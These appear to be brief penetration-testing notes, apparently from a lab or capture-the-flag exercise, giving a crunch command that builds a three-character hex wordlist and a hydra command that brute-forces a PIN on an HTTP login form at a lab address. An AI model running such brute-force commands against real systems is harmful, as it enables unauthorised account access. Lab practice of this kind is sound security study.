## Crunch
App to make a wordlist
- Command: `crunch 3 3 0123456789ABCDEF -o 3digits.txt`

## Hydra
Brute force http post form
- Command: `hydra -l '' -P 3digits.txt -f -v 10.10.14.190 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000`
